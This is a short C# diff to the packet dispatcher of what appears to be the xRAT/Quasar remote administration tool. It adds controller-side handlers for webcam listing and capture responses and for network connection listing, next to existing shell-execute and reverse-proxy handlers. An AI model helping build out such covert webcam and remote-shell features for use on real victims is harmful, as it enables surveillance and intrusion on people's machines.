@@ -52,6 +52,14 @@ namespace xServer.Core.Packets
             {
                 CommandHandler.HandleGetMonitorsResponse(client, (ClientPackets.GetMonitorsResponse)packet);
             }
+            else if (type == typeof(ClientPackets.GetWebcamsResponse))
+            {
+                CommandHandler.HandleGetWebcamsResponse(client, (ClientPackets.GetWebcamsResponse)packet);
+            }
+            else if (type == typeof(ClientPackets.GetWebcamResponse))
+            {
+                CommandHandler.HandleGetWebcamResponse(client, (ClientPackets.GetWebcamResponse)packet);
+            }
             else if (type == typeof(ClientPackets.DoShellExecuteResponse))
             {
                 CommandHandler.HandleDoShellExecuteResponse(client,
@@ -111,6 +119,10 @@ namespace xServer.Core.Packets
                     type == typeof(ReverseProxy.Packets.ReverseProxyDisconnect))
             {
                 ReverseProxyCommandHandler.HandleCommand(client, packet);
+            }
+            else if (type == typeof(ClientPackets.GetConnectionsResponse))
+            {
+                CommandHandler.HandleGetConnectionsResponse(client, (ClientPackets.GetConnectionsResponse)packet);
             }
         }
     }
